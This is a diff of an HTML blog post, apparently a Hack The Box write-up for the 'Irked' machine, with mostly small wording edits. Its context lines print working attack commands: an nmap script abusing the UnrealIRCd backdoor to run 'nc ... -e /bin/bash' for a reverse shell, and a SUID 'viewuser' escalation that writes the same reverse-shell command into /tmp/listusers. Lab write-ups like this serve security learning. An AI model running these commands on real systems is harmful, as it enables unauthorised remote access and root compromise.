@@ -169,7 +169,7 @@
 
 <h3 id="overview">Overview</h3>
 
-<p>This box was an easy level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/624">MrAgent</a>, it started with finding <code class="highlighter-rouge">unrealircd</code> running on the box and using and a nse script to get command execution using the backdoor that was in <code class="highlighter-rouge">unrealircd</code>. After basic enumeration we found a <code class="highlighter-rouge">.backup</code> which had a password, we used that password in steghide to extract the password of user <code class="highlighter-rouge">djmardov</code> from the image in <code class="highlighter-rouge">/var/www/html/</code>, we gain the root access by exploiting a SUID binary named <code class="highlighter-rouge">viewuser</code>.</p>
+<p>This box was an easy level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/624">MrAgent</a>, it started with finding <code class="highlighter-rouge">unrealircd</code> running on the box and using a nse script to pop a shell on the box using the backdoor that was in <code class="highlighter-rouge">unrealircd</code>. After basic enumeration we found a <code class="highlighter-rouge">.backup</code> which had a password, we use that password in <code class="highlighter-rouge">steghide</code> to extract the password of user <code class="highlighter-rouge">djmardov</code> from the image in <code class="highlighter-rouge">/var/www/html/</code>, We gain the root access by exploiting a SUID binary named <code class="highlighter-rouge">viewuser</code>.</p>
 
 <h3 id="enumeration">Enumeration</h3>
 
@@ -218,7 +218,7 @@ No exact OS matches <span class="k">for </span>host <span class="o">(</span>If y
 <span class="o">[</span>REDACTED]
 <span class="c"># Nmap done at Sat Sep 26 15:31:39 2020 -- 1 IP address (1 host up) scanned in 1515.54 seconds</span></code></pre></figure>
 
-<p>Among the open ports, <code class="highlighter-rouge">6697,8067,55873,65534</code> related to <code class="highlighter-rouge">irc</code> and the <code class="highlighter-rouge">webserver</code> on port <code class="highlighter-rouge">80</code> looks intresting, I am gonna start with enumerating webserver.</p>
+<p>Among the open ports, <code class="highlighter-rouge">6697,8067,55873,65534</code> related to <code class="highlighter-rouge">irc</code> and the <code class="highlighter-rouge">webserver</code> on port <code class="highlighter-rouge">80</code> seems intresting, I am gonna start with enumerating webserver.</p>
 
 <h4 id="enumerating-the-web-server">Enumerating the web server</h4>
 
@@ -226,11 +226,11 @@ No exact OS matches <span class="k">for </span>host <span class="o">(</span>If y
   <img src="/assets/documentation/irkedwebserver-930e2f3fce3ba89f85920189a8159927d02020e54b0dc82789822dbbdb811782.png" alt="Irkedwebsiteimage" class="zooming" data-rjs="/assets/documentation/irkedwebserver-930e2f3fce3ba89f85920189a8159927d02020e54b0dc82789822dbbdb811782.png" data-zooming-width="1366" data-zooming-height="715" />
 </a></p>
 
-<p><code class="highlighter-rouge">IRC is almost working!</code> ..hmm, did some basic enum on website like checking for <code class="highlighter-rouge">robots.txt</code> and directory fuzzing but wasn’t able to find anything useful, time to jump to <code class="highlighter-rouge">IRC</code>.</p>
+<p><code class="highlighter-rouge">IRC is almost working!</code> ..hmm, did some basic enum on webserver like checking for <code class="highlighter-rouge">robots.txt</code>, directory fuzzing and nikto scan but wasn’t able to find anything useful, time to jump to <code class="highlighter-rouge">IRC</code>.</p>
 
 <h4 id="foothold">Foothold</h4>
 
-<p>A simple google search for <code class="highlighter-rouge">Unrealircd exploits</code> lead me to this <a href="https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html">nmap script</a> which can be used to find a backdoor which was in Unrealircd, it can also be used to execute commands. Starting a netcat listener using <code class="highlighter-rouge">rlwrap nc -lvnp 9889</code> and running the nmap script to get a shell using netcat.</p>
+<p>A simple google search for <code class="highlighter-rouge">Unrealircd exploits</code> lead me to this <a href="https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html">nmap script</a> which can be used to find a backdoor which was in Unrealircd and can also be used to execute commands. Starting a netcat listener using <code class="highlighter-rouge">rlwrap nc -lvnp 9889</code> and running the nmap script to get a shell using netcat.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Irked]
 └──╼ <span class="nv">$nmap</span> <span class="nt">-d</span> <span class="nt">-p</span> 6697,8067,55873,65534 <span class="nt">--script</span><span class="o">=</span>irc-unrealircd-backdoor.nse <span class="nt">--script-args</span><span class="o">=</span>irc-unrealircd-backdoor.command<span class="o">=</span><span class="s1">'nc 10.10.14.8 9889 -e /bin/bash'</span> 10.10.10.117
@@ -267,7 +267,7 @@ connect to <span class="o">[</span>10.10.14.8] from <span class="o">(</span>UNKN
 
 <h4 id="getting-user">Getting User</h4>
 
-<p>During basic enumeration we get a file <code class="highlighter-rouge">.backup</code> in user <code class="highlighter-rouge">djmardov</code> Document directory.</p>
+<p>During basic enumeration we get a file <code class="highlighter-rouge">.backup</code> in user <code class="highlighter-rouge">djmardov</code> Documents directory.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">ircd@irked:/home/djmardov/Documents<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
 <span class="nb">ls</span> <span class="nt">-la</span>
@@ -378,7 +378,7 @@ It is still being actively developed
 <span class="o">(</span>unknown<span class="o">)</span> :0           2020-09-26 16:15 <span class="o">(</span>:0<span class="o">)</span>
 <span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>djmardov<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>djmardov<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,110<span class="o">(</span>lpadmin<span class="o">)</span>,113<span class="o">(</span>scanner<span class="o">)</span>,117<span class="o">(</span>bluetooth<span class="o">)</span></code></pre></figure>
 
-<p>And the uid get set as root, so let’s use this to get a shell with <code class="highlighter-rouge">uid=0</code>, starting our netcat listener <code class="highlighter-rouge">rlwrap nc -lvnp 9001</code>.</p>
+<p>Let’s use this SUID binary to get a shell with <code class="highlighter-rouge">uid=0</code>.</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash">djmardov@irked:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"nc 10.10.14.8 9001 -e /bin/bash"</span> <span class="o">&gt;</span> /tmp/listusers
 <span class="nb">echo</span> <span class="s2">"nc 10.10.14.8 9001 -e /bin/bash"</span> <span class="o">&gt;</span> /tmp/listusers
